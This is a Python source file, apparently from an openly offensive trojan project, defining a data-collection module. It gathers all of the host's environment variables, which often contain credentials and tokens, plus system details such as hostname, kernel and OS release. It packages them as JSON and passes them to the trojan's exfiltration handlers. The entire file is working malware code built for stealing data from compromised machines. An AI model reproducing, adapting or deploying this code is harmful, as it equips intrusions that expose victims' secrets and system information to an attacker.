#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = 'EONRaider @ keybase.io/eonraider'

import json
import os
import platform

from src.modules.exploitation.base import ExploitationModule


class SystemInformation(ExploitationModule):
    def __init__(self):
        """Perform a collection of data on the host's system resources
        and send it to pre-configured exfiltration methods."""
        super().__init__()
        self.sys_info = dict()
        self.env_info = dict()

    @property
    def contents(self) -> str:
        self.sys_info.update({"environment": self.env_info})
        return json.dumps(self.sys_info)

    @property
    def has_data(self) -> bool:
        return bool(len(self.sys_info))

    def execute(self):
        """Extract information from the host, including environment
        variables and system configuration data such as kernel version,
        hostname, OS release name, OS release version and processor
        architecture."""
        self.env_info = {env: value for env, value in os.environ.items()}
        self.sys_info = platform.uname()._asdict()
        self._notify_all_exfiltrators()
